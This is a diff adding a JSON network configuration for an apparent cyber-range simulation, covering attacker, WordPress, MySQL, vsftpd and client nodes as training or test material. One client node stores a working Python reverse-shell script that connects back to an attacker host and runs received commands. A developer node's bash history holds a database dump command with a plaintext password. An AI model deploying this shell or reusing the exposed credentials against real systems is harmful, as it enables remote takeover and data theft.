@@ -1,0 +1,1909 @@
+[
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.ActiveServiceConfig",
+        "type": "netsecenv_agent",
+        "name": "netsecenv_agent",
+        "owner": "attacker",
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "configuration": null,
+        "id": "node_attacker.netsecenv_agent",
+        "ref": "5135d821-a913-49bb-96f2-7121b690148d"
+      }
+    ],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "metasploit",
+        "owner": "msf",
+        "version": "0.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_attacker.metasploit",
+        "ref": "0e1de8bc-e407-4644-a233-bff14ad3ce36"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.4.10"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.4.0/24"
+        },
+        "index": 0,
+        "ref": "ec51bdca-126c-455b-a447-e623c5e732ca",
+        "name": "interface_0",
+        "id": "node_attacker.interface_0"
+      }
+    ],
+    "ref": "51afb0d4-9354-41f5-9d05-575137608659",
+    "name": "node",
+    "id": "node_attacker"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "coredns",
+        "owner": "coredns",
+        "version": "1.11.1",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_dns.coredns",
+        "ref": "9153f61e-a87b-496c-9c48-3fd139c95b20"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.4.2"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.4.0/24"
+        },
+        "index": 0,
+        "ref": "60ad86cf-c02e-42fb-b8ca-fe69f02f2943",
+        "name": "interface_0",
+        "id": "node_dns.interface_0"
+      }
+    ],
+    "ref": "eeea5b67-3a23-4e5a-8551-cd101899f4fa",
+    "name": "node",
+    "id": "node_dns"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "wordpress",
+        "owner": "wordpress",
+        "version": "6.1.1",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+            "provider_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+              "_value": "LOCAL"
+            },
+            "token_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+              "_value": "PASSWORD"
+            },
+            "token_security": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+              "_value": "SEALED"
+            },
+            "ip": null,
+            "timeout": 30,
+            "ref": "wordpress_pwd",
+            "name": "authentication_provider_0",
+            "id": "node_wordpress.wordpress.authentication_provider_0"
+          }
+        ],
+        "access_schemes": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AccessSchemeConfig",
+            "authentication_providers": [
+              {
+                "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+                "provider_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+                  "_value": "LOCAL"
+                },
+                "token_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+                  "_value": "PASSWORD"
+                },
+                "token_security": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+                  "_value": "SEALED"
+                },
+                "ip": null,
+                "timeout": 30,
+                "ref": "wordpress_pwd",
+                "name": "authentication_provider_0",
+                "id": "node_wordpress.wordpress.authentication_provider_0"
+              }
+            ],
+            "authorization_domain": {
+              "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainConfig",
+              "type": {
+                "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainType",
+                "_value": "LOCAL"
+              },
+              "authorizations": [
+                {
+                  "py/object": "cyst.api.configuration.logic.access.AuthorizationConfig",
+                  "identity": "wordpress",
+                  "access_level": {
+                    "py/object": "cyst.api.logic.access.AccessLevel",
+                    "_value": "ELEVATED"
+                  },
+                  "ref": "5e70e393-775c-4fa5-89bc-fd60b61643d8",
+                  "name": "authorization_0",
+                  "id": "node_wordpress.wordpress.access_scheme_0.authorization_domain_0.authorization_0"
+                }
+              ],
+              "ref": "518b23d3-c717-48dd-999f-3d34c109038c",
+              "name": "authorization_domain_0",
+              "id": "node_wordpress.wordpress.access_scheme_0.authorization_domain_0"
+            },
+            "ref": "30feb151-de2a-4db6-9b99-f99f10c223a9",
+            "name": "access_scheme_0",
+            "id": "node_wordpress.wordpress.access_scheme_0"
+          }
+        ],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_wordpress.wordpress",
+        "ref": "098dc809-cd60-4b00-beff-12f57b6965d6"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.10"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 0,
+        "ref": "f83cb965-7d14-4190-a8a3-b892851f2306",
+        "name": "interface_0",
+        "id": "node_wordpress.interface_0"
+      }
+    ],
+    "ref": "953c7fa0-fd01-4905-ba4a-b26a6a516870",
+    "name": "node",
+    "id": "node_wordpress"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "mysql",
+        "owner": "mysql",
+        "version": "8.0.31",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+            "provider_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+              "_value": "LOCAL"
+            },
+            "token_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+              "_value": "PASSWORD"
+            },
+            "token_security": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+              "_value": "SEALED"
+            },
+            "ip": null,
+            "timeout": 30,
+            "ref": "mysql_pwd",
+            "name": "authentication_provider_0",
+            "id": "node_wordpress_database.mysql.authentication_provider_0"
+          }
+        ],
+        "access_schemes": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AccessSchemeConfig",
+            "authentication_providers": [
+              {
+                "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+                "provider_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+                  "_value": "LOCAL"
+                },
+                "token_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+                  "_value": "PASSWORD"
+                },
+                "token_security": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+                  "_value": "SEALED"
+                },
+                "ip": null,
+                "timeout": 30,
+                "ref": "mysql_pwd",
+                "name": "authentication_provider_0",
+                "id": "node_wordpress_database.mysql.authentication_provider_0"
+              }
+            ],
+            "authorization_domain": {
+              "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainConfig",
+              "type": {
+                "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainType",
+                "_value": "LOCAL"
+              },
+              "authorizations": [
+                {
+                  "py/object": "cyst.api.configuration.logic.access.AuthorizationConfig",
+                  "identity": "mysql",
+                  "access_level": {
+                    "py/object": "cyst.api.logic.access.AccessLevel",
+                    "_value": "ELEVATED"
+                  },
+                  "ref": "5fbe7f9f-1f10-41d4-a36f-e42d170b3e94",
+                  "name": "authorization_0",
+                  "id": "node_wordpress_database.mysql.access_scheme_0.authorization_domain_0.authorization_0"
+                }
+              ],
+              "ref": "d43afd8e-3215-4c8a-8fc0-cfa86d02d5d9",
+              "name": "authorization_domain_0",
+              "id": "node_wordpress_database.mysql.access_scheme_0.authorization_domain_0"
+            },
+            "ref": "af5dd735-2c76-4442-aa24-6880f30d7ad9",
+            "name": "access_scheme_0",
+            "id": "node_wordpress_database.mysql.access_scheme_0"
+          }
+        ],
+        "public_data": [],
+        "private_data": [
+          {
+            "py/object": "cyst.api.configuration.logic.data.DataConfig",
+            "owner": "mysql",
+            "description": "secret data for exfiltration",
+            "ref": "cc9f45b5-7863-4f7a-81b9-538e80b3a0ae",
+            "name": "data",
+            "id": "db"
+          }
+        ],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_wordpress_database.mysql",
+        "ref": "36c1b097-175b-444a-a8c5-1a31edfb66e3"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.11"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 0,
+        "ref": "ce432994-1ef5-43d9-b696-ed3da81fca73",
+        "name": "interface_0",
+        "id": "node_wordpress_database.interface_0"
+      }
+    ],
+    "ref": "6ebfeeab-0b2e-48c2-8026-bb9700cf9ada",
+    "name": "node",
+    "id": "node_wordpress_database"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "vsftpd",
+        "owner": "vsftpd",
+        "version": "2.3.4",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_vsftpd.vsftpd",
+        "ref": "55148f22-7608-4152-8a78-901d1f7c7e60"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.12"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 0,
+        "ref": "00bb91b6-48a9-4376-ba5b-282f3ff2fec0",
+        "name": "interface_0",
+        "id": "node_vsftpd.interface_0"
+      }
+    ],
+    "ref": "9e9488a8-d3ff-4d18-9014-541919cb4f76",
+    "name": "node",
+    "id": "node_vsftpd"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "tchat",
+        "owner": "chat",
+        "version": "2.3.4",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_chat.tchat",
+        "ref": "f0bf4d07-5168-4f69-aaa6-ede9cfea39a5"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.14"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 0,
+        "ref": "db7e79de-4935-4b00-a1ab-e2bb390a118b",
+        "name": "interface_0",
+        "id": "node_chat.interface_0"
+      }
+    ],
+    "ref": "260d7831-c067-4de3-9043-397d7115f430",
+    "name": "node",
+    "id": "node_chat"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "dovecot-imapd",
+        "owner": "haraka",
+        "version": "2.3.4",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "LIMITED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_haraka.dovecot-imapd",
+        "ref": "b1ddd916-54a8-4047-90a3-cfdfe61ec719"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.3.13"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.3.0/24"
+        },
+        "index": 0,
+        "ref": "9bf5f60d-7bda-45c9-a1f6-d6b93cc2474c",
+        "name": "interface_0",
+        "id": "node_haraka.interface_0"
+      }
+    ],
+    "ref": "56dd6d4a-9e0b-4856-915a-710b62e5ad96",
+    "name": "node",
+    "id": "node_haraka"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "ssh",
+        "owner": "ssh",
+        "version": "5.1.4",
+        "local": false,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+            "provider_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+              "_value": "LOCAL"
+            },
+            "token_type": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+              "_value": "PASSWORD"
+            },
+            "token_security": {
+              "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+              "_value": "SEALED"
+            },
+            "ip": null,
+            "timeout": 30,
+            "ref": "user_pc_pwd",
+            "name": "authentication_provider_0",
+            "id": "node_developer.ssh.authentication_provider_0"
+          }
+        ],
+        "access_schemes": [
+          {
+            "py/object": "cyst.api.configuration.logic.access.AccessSchemeConfig",
+            "authentication_providers": [
+              {
+                "py/object": "cyst.api.configuration.logic.access.AuthenticationProviderConfig",
+                "provider_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationProviderType",
+                  "_value": "LOCAL"
+                },
+                "token_type": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenType",
+                  "_value": "PASSWORD"
+                },
+                "token_security": {
+                  "py/object": "cyst.api.logic.access.AuthenticationTokenSecurity",
+                  "_value": "SEALED"
+                },
+                "ip": null,
+                "timeout": 30,
+                "ref": "user_pc_pwd",
+                "name": "authentication_provider_0",
+                "id": "node_developer.ssh.authentication_provider_0"
+              }
+            ],
+            "authorization_domain": {
+              "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainConfig",
+              "type": {
+                "py/object": "cyst.api.configuration.logic.access.AuthorizationDomainType",
+                "_value": "LOCAL"
+              },
+              "authorizations": [
+                {
+                  "py/object": "cyst.api.configuration.logic.access.AuthorizationConfig",
+                  "identity": "user",
+                  "access_level": {
+                    "py/object": "cyst.api.logic.access.AccessLevel",
+                    "_value": "ELEVATED"
+                  },
+                  "ref": "98f950a6-1ae2-405f-9497-5b9c8f0ea6b5",
+                  "name": "authorization_0",
+                  "id": "node_developer.ssh.access_scheme_0.authorization_domain_0.authorization_0"
+                }
+              ],
+              "ref": "140ba3a7-88f9-4ce4-8781-cce5f512a6ff",
+              "name": "authorization_domain_0",
+              "id": "node_developer.ssh.access_scheme_0.authorization_domain_0"
+            },
+            "ref": "e1053fc1-da72-4850-906d-5681b13e4378",
+            "name": "access_scheme_0",
+            "id": "node_developer.ssh.access_scheme_0"
+          }
+        ],
+        "public_data": [],
+        "private_data": [
+          {
+            "py/object": "cyst.api.configuration.logic.data.DataConfig",
+            "owner": "user",
+            "description": "mysqldump -u wordpress -h 192.168.3.11 --password=wordpress --no-tablespaces wordpress",
+            "ref": "e16d5134-072a-4261-8ded-02abcf4a5407",
+            "name": "data",
+            "id": "/home/user/.bash_history"
+          }
+        ],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [
+          {
+            "py/tuple": [
+              {
+                "py/object": "cyst.api.configuration.host.service.ServiceParameter",
+                "_value": "ENABLE_SESSION"
+              },
+              true
+            ]
+          },
+          {
+            "py/tuple": [
+              {
+                "py/object": "cyst.api.configuration.host.service.ServiceParameter",
+                "_value": "SESSION_ACCESS_LEVEL"
+              },
+              {
+                "py/object": "cyst.api.logic.access.AccessLevel",
+                "_value": "ELEVATED"
+              }
+            ]
+          }
+        ],
+        "id": "node_developer.ssh",
+        "ref": "408c21a2-3ae0-4ae4-bb8d-ddd32b7a8b9a"
+      },
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "mysql-client",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_developer.mysql-client",
+        "ref": "81681893-31bb-4aca-b579-1a7e9d660f3e"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.10"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "6076bcb7-64a4-4eb5-8412-cf9b3c866bdd",
+        "name": "interface_0",
+        "id": "node_developer.interface_0"
+      }
+    ],
+    "ref": "cf5d5def-9182-4caa-ba18-dde78cb3b1dd",
+    "name": "node",
+    "id": "node_developer"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "python3",
+        "owner": "user",
+        "version": "3.11.1",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [
+          {
+            "py/object": "cyst.api.configuration.logic.data.DataConfig",
+            "owner": "user",
+            "description": "#!/bin/python3\n\nimport socket\nimport subprocess\nimport os\nimport time\n\ndef create_connection(target, port):\n    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    so.connect((target, port))\n    print(\"phishing successful\")\n    while True:\n        d = so.recv(1024)\n        if len(d) == 0:\n            break\n        p = subprocess.Popen(d, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        o = p.stdout.read() + p.stderr.read()\n        so.send(o)\n\n\nif __name__ == '__main__':\n    attacker_host = os.getenv(\"ATTACKER_ADDRESS\", \"node_attacker\")\n    attacker_port = int(os.getenv(\"ATTACKER_PORT\", 4444))\n    print(f\"Back-connect to {attacker_host}:{attacker_port}\")\n    while True:\n        try:\n            create_connection(attacker_host, attacker_port)\n        except Exception as ex:\n            print(f\"Unable to connect to the attacker due to {ex}\")\n            time.sleep(5)\n",
+            "ref": "d0dfa25c-d85c-42e1-9f45-fd2b563fb1cf",
+            "name": "data",
+            "id": "/entrypoints/phishing.py"
+          }
+        ],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client1.python3",
+        "ref": "e50ec979-084c-43b0-a3fc-1e3a0c79b16c"
+      },
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client1.inetutils-ping",
+        "ref": "2e966d1f-d9d7-44ae-9297-18561570c4a9"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.11"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "7f70fc8c-1ba4-478d-91b4-cdd5d12b3561",
+        "name": "interface_0",
+        "id": "node_client1.interface_0"
+      }
+    ],
+    "ref": "bec9e98a-9c87-43b8-8e9d-5df6188fb871",
+    "name": "node",
+    "id": "node_client1"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client2.inetutils-ping",
+        "ref": "a1cecfa5-f175-4793-8b99-f7d15aba170d"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.12"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "a7415bf4-fcaf-4328-809a-c05b207a02d0",
+        "name": "interface_0",
+        "id": "node_client2.interface_0"
+      }
+    ],
+    "ref": "249fd74d-4820-47a3-9393-d1ab863fdda7",
+    "name": "node",
+    "id": "node_client2"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client3.inetutils-ping",
+        "ref": "fa91d6ac-1669-45c0-95aa-dd7954a19419"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.13"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "cf934df1-21b2-4109-8ef4-7dbc0ebc6533",
+        "name": "interface_0",
+        "id": "node_client3.interface_0"
+      }
+    ],
+    "ref": "05d1d9e7-8654-49c3-9a97-4aa62d4bd36d",
+    "name": "node",
+    "id": "node_client3"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client4.inetutils-ping",
+        "ref": "021b071d-5083-4ea1-8757-fd9d8a16404c"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.10"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 0,
+        "ref": "104aaa2c-187e-440d-b5ed-b580a89d2bf3",
+        "name": "interface_0",
+        "id": "node_client4.interface_0"
+      }
+    ],
+    "ref": "33e86874-1112-48ff-a926-7b38a370b4ef",
+    "name": "node",
+    "id": "node_client4"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client5.inetutils-ping",
+        "ref": "219c968c-9052-4433-9491-4780035a39fc"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.11"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 0,
+        "ref": "df5f98b3-66ff-4394-8d2e-2c24f9963906",
+        "name": "interface_0",
+        "id": "node_client5.interface_0"
+      }
+    ],
+    "ref": "d1f93acc-f923-4371-8540-a2863e419e2c",
+    "name": "node",
+    "id": "node_client5"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.node.NodeConfig",
+    "active_services": [],
+    "passive_services": [
+      {
+        "py/object": "cyst.api.configuration.host.service.PassiveServiceConfig",
+        "name": "inetutils-ping",
+        "owner": "user",
+        "version": "8.1.0",
+        "local": true,
+        "access_level": {
+          "py/object": "cyst.api.logic.access.AccessLevel",
+          "_value": "ELEVATED"
+        },
+        "authentication_providers": [],
+        "access_schemes": [],
+        "public_data": [],
+        "private_data": [],
+        "public_authorizations": [],
+        "private_authorizations": [],
+        "parameters": [],
+        "id": "node_client6.inetutils-ping",
+        "ref": "fd6d8069-1034-498c-8b98-8a79c318469c"
+      }
+    ],
+    "traffic_processors": [],
+    "shell": "",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.2.12"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.2.0/24"
+        },
+        "index": 0,
+        "ref": "1bbef644-5c2d-4eec-8afa-c46cd239288e",
+        "name": "interface_0",
+        "id": "node_client6.interface_0"
+      }
+    ],
+    "ref": "ebb7bf81-f097-48ec-a611-2e4f04cdd68f",
+    "name": "node",
+    "id": "node_client6"
+  },
+  {
+    "py/object": "cyst.api.configuration.network.router.RouterConfig",
+    "interfaces": [
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 0,
+        "ref": "70baeb2d-b471-4ed6-81c8-ec5d200a2a76",
+        "name": "interface_0",
+        "id": "perimeter_router.interface_0"
+      },
+      {
+        "py/object": "cyst.api.configuration.network.elements.InterfaceConfig",
+        "ip": {
+          "py/object": "netaddr.ip.IPAddress",
+          "_value": "192.168.1.1"
+        },
+        "net": {
+          "py/object": "netaddr.ip.IPNetwork",
+          "_value": "192.168.1.0/24"
+        },
+        "index": 1,
+        "ref": "e14c1ffd-bf6f-40cd-a4c9-e63fa7c46b54",
